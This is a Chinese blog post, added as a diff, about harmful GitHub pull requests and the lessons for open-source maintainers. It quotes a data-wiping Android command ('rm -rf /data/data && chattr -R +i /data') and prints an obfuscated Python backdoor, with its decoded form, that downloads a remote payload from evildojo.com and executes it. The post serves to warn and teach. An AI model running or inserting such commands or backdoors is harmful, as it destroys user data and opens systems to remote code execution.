@@ -1,0 +1,136 @@
+---
+layout: post
+title:  "【PR】This is a joke"
+date:   2025-04-12 21:00:000 +0800
+categories: github PR
+lang: zh-CN
+---
+
+半个月前，著名开源项目 [Dify](https://github.com/langgenius/dify) 收到了来自丽珠医药的[这样](https://github.com/langgenius/dify/pull/16819) 一个 PR
+
+<img src="https://github.com/grimoire/grimoire.github.io/blob/joke-pr-resources/resources/01.png?raw=true" alt="dify-joke" style="width:512px;"/>
+
+大量违反开源协议的内容，甚至还把人家的图标改了...无奈之下 Dify 只能发了封律师函表达抗议。顺便提一句，丽珠医药在国内最出名的产品大概是🤣
+
+<img src="https://github.com/grimoire/grimoire.github.io/blob/joke-pr-resources/02.jpg?raw=true" alt="taitai" style="width:512px;"/>
+
+{% include note.html content="询问了一下 D 老师以及一些[公开材料](https://ipc.court.gov.cn/zh-cn/news/view-842.html)，开源协议可以被视作是一种著作权以及相关的合同，是具有法律效益的。
+" %}
+
+除了上面内容以外，最让我惊讶的开发者居然把大量的私钥也放在 PR 中一起提交上来了，也算是应了那句 `坏人绞尽脑汁不如蠢人灵机一动` 了。
+
+<img src="https://github.com/grimoire/grimoire.github.io/blob/joke-pr-resources/03.jpg?raw=true" alt="private-keys" style="width:512px;"/>
+
+参与开源项目的门槛很低，作为项目的 owner，大家通常倾向于鼓励社区向自己的项目作出贡献，哪怕提交的代码不算完美。这种自由也给项目的参与者和使用者带来了一些安全隐患，给自己或他人带来损失。下面给大家展示一些例子
+
+{% include note.html content="下面的都是反面教材，<span style="color:red"><b>绝对不要学</b></span>！！！如果你闯祸也别把我供出来！！！
+" %}
+
+## 你的环境应该是一次性的吧
+
+[aliyun-cli](https://github.com/aliyun/aliyun-cli) 是阿里云命令行开源工具，方便用户管理阿里云资源。作为大公司的项目，照理说应该不会出现什么草台班子的行为。但是
+
+<img src="https://github.com/grimoire/grimoire.github.io/blob/joke-pr-resources/04.jpg?raw=true" alt="ali" style="width:512px;"/>
+
+也就是说你如果是个负责任的开源贡献者，想在提交代码前做一些单元测试，那么你可能就要和自己的开发环境说再见了😇。
+
+大公司通常会有更完善的测试团队来搭建测试环境，所有的测试会被放在一个相对隔离的容器环境中执行以确保安全，隔离的环境也就意味着可以进行风险更高的测试。但是个人开发者由于资源，时间以及能力有限，未必会做这种环境隔离。这种开发习惯的差异应该就是这个悲剧的源头。
+
+所以还是希望大家在参与开源项目开发时也尽可能做好隔离。
+
+## 我只想开个玩笑……
+
+上面的例子是由于环境隔离导致开发者损失，这个例子会直接导致最终用户痛失数据。[Exposed](https://github.com/ElderDrivers/EdXposed) 是一个在安卓<span style="color:red"><b>高权限</b></span>模式下运行的框架，可以在不修改 APK 的前提下修改程序运行。
+
+项目配置了 Canary release，将新PR的功能打包成一个相对不稳定的版本，方便测试或让一些想尝鲜的用户抢先体验。这本身算是个常见的配置，但是也给下面的事故埋下了伏笔。
+
+最初，有一位开发者发现了一个[漏洞](https://github.com/ElderDrivers/EdXposed/pull/537)， 可以将<span style="color:red"><b>删除用户数据</b></span>的脚本放到项目中，通过 PR 触发 Canary build。还好，这个版本并没有被推送给用户。
+
+<img src="https://github.com/grimoire/grimoire.github.io/blob/joke-pr-resources/05.jpg?raw=true" alt="ghost" style="width:512px;"/>
+
+不幸的是，另一位开发者看到了这个 PR，想和开发者开一个玩笑，于是将这盘“贞子的录像带”又[拷贝](https://github.com/ElderDrivers/EdXposed/pull/540)了一次，这次显然就没那么幸运了，该版本被推送到了部分倒霉的用户手中，摘录一下开发者的原话
+
+>　　我添加的代码是 rm -rf /data/data && chattr -R +i /data。这个代码前半部分和上面同理，意思是删除根目录下的 /data/data 文件夹。后半部分的意思是锁定根目录下的 Data 文件夹，被锁定的文件夹无法被修改(比如删除、重命名、写入内容)。
+>
+>　　这里有必要再介绍一下 /data/data 下是什么东西。
+>
+>　　大部分用户对刷机都非常熟悉，刷机中的“双清+格式化 Data”一般被认为等于手机恢复出厂设置，而双清中的一个清理即为清理 Data，即我上面所说的，根目录下的 Data 文件夹。而在 TWRP 中，清理 Data 会默认跳过 /data/media，这也是为什么清理了 Data 分区还要进行一次格式化 Data。/data/data 文件夹作为 Data 分区下的文件夹，存储了某些重要的系统文件，但是除 Termux 等比较特殊的软件，一般来说，没有任何用户重要的数据存储在这个文件夹下。如果你有 root 权限的话，你可以打开这个文件夹看看，/data/data 下大部分文件都是空的。就像你在 TWRP 中清理了 Data 分区后可以正常开机，你手机内置存储的文件不会在清理 Data 后丢失，而我这个指令只是清除 Data 分区下的的一个文件夹，一般来说，不会造成特别重大的损失(比如你手机里的照片和视频都不会丢失)，但是还是会对大部分用户使用造成不可忽视的负面影响。
+>
+>　　再必须重点提及的是锁定 Data 分区。
+>
+>　　chattr +i 是 Linux 下锁定某一文件/目录的指令，其原意是为了锁定某一个特别重要的文件防止被进行任何修改。这个指令不会对你的数据造成任何破坏，相反，被锁定的数据不可能被进行任何更改。与之相应的，因为禁止读写，手机也无法正常使用。这个问题可以通过输入 chattr -i 解除锁定。
+
+这位同学事后进行了道歉，也表达愿意尽力承担损失，但是被害者们似乎[不太买帐](https://github.com/ElderDrivers/EdXposed/pull/542)……
+
+{% include note.html content="
+这类问题常见于那些需要搭建复杂测试环境的项目，当用户有意或无意将包含恶意代码的内容提交到项目中时，可能会使得整个测试环境报销，所以大家在开发过程中请务必注意：
+
+1. 尽可能做好环境隔离，使用容器来测试项目
+2. 对于不熟悉的贡献者，开启手动 approval，在确保安全的情况下再启动检查和自动化测试
+3. 务必认真进行 review
+“ %}
+
+## 你是故意的还是不小心的？
+
+如果说上面的错误源于不谨慎和贪玩，下面的内容则包含明确的恶意了。
+
+2024年11月，exo-explore 收到了这样一个 PR
+
+<img src="https://github.com/grimoire/grimoire.github.io/blob/joke-pr-resources/06.png?raw=true" alt="explore" style="width:512px;"/>
+
+上面的数字转码后
+
+```python
+''.join(chr(x) for x in [105,109,112,111,114,116,32,111,115,10,105,109,112,111,114,116,32,117,114,108,108,105,98,10,105,109,112,111\ ,114,116,32,117,114,108,108,105,98,46,114,101,113,117,101 ,115,116,10,120,32,61,32,117,114,108,108,105,98,46,114,101,113,117,101,115,11\ 6,46,117,114,108,111,112,101,110,40,34,104,116,116,112,115,58,47,47,119,119,119,46,101, 118,105,108,100,111,106,111,46,99,111,109,47,11\ 5,116,97,103,101,49,112,97,121,108,111,97,100,34,41,10,121,32,61,32,120,46,114,101,97,100,40,41,10,122,32,61,32,121,4,6,100,101,99,111,\ 00,101,40,34,117,116,102,56,34,41,10,120,46,99,108,111,115,101,40,41,10,111,115,46,115,121,115,116,101,109,40,122,411,10])
+```
+
+```python
+import os
+import urllib
+import urllib.request
+x = urllib.request.urlopen("https://www.evildojo.com/stage1payload")
+y = x.read()
+z = ydecode("utf8")
+x.close()
+os.system(z)
+```
+
+不难看出是加了一个后门。根据 [hacknews](https://news.ycombinator.com/item?id=42118097) 上的报告，这位好像是惯犯了
+
+<img src="https://github.com/grimoire/grimoire.github.io/blob/joke-pr-resources/07.jpg?raw=true" alt="explore2" style="width:512px;"/>
+
+加后门的手段不算高明，但是毕竟很多人并没有相关领域的知识，难保不会有中招的，review 代码时还是要长个心眼。
+
+## 这么好的 PR 要让大家都看到
+
+上面的例子会让人有“我这么菜应该不会闯祸吧”的错觉。那么可以看看这位勇士吧
+
+Unreal 是现在最知名的游戏引擎之一了，也吸引着数量庞大的社区开发者。能够在这样规模的项目中作出贡献更能够让自己的能力受到认可。[这位](https://github.com/Rohith-sreedharan)同学显然也是这么认为的。
+
+但是当时还是新手的他可能还不足以优化蓝图或渲染逻辑，于是像每个新人一样，从修 typo 开始。不过好像不太顺利😅
+
+<img src="https://github.com/grimoire/grimoire.github.io/blob/joke-pr-resources/08.jpg?raw=true" alt="roh" style="width:512px;"/>
+
+试图用自己的乐观态度说服 reviewer，也失败了
+
+<img src="https://github.com/grimoire/grimoire.github.io/blob/joke-pr-resources/09.jpg?raw=true" alt="roh2" style="width:512px;"/>
+
+当然，如果只是这些倒也没啥，谁没有提过几个低质量 PR 呢？可是提 PR 的方式就让人有点蚌不住了🤣
+
+<img src="https://github.com/grimoire/grimoire.github.io/blob/joke-pr-resources/10.jpg?raw=true" alt="roh3" style="width:512px;"/>
+
+为了催促尽快合并 PR，他 @ 了 EpicGame 下的多个群组，约 400k 的用户收到了通知，而当任何一个用户在这个 PR 下回复时，又会再次通知所有人...
+
+严格的说，这是 github 本身的通知机制没有做好限制导致的。这位同学很快意识到自己做了什么，在 twitter 上作出了道歉，希望他未来的职业道路一帆风顺吧。
+
+## 尾声
+
+会想起发这个是因为最近收到了这样一个 [PR](https://github.com/InternLM/lmdeploy/pull/3353)，展示了我们自己在功能开发时埋下的隐患，我非常感谢这位朋友的提醒和贡献。
+
+This work is licensed under a
+[Creative Commons Attribution-ShareAlike 4.0 International License][cc-by-sa].
+
+[![CC BY-SA 4.0][cc-by-sa-image]][cc-by-sa]
+
+[cc-by-sa]: http://creativecommons.org/licenses/by-sa/4.0/
+[cc-by-sa-image]: https://licensebuttons.net/l/by-sa/4.0/88x31.png
